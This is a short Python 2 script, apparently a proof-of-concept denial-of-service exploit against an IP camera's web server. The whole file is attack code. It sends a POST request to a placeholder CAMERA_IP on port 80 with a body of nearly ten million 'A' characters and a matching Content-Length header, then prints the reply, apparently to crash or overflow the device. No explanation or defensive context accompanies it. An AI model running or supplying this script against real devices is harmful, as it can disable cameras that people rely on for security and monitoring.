import string
import httplib
import urllib2

host = "CAMERA_IP"
port = 80
params='A'*9999999

headers = { 
"Host": host + ':' + str(port),
"Connection": "keep-alive",
"Content-Length": 9999999,
}

url = "/"

conn = httplib.HTTPConnection(host,port=port)
conn.request("POST",url,params,headers)
response = conn.getresponse()
data = response.read()
print data
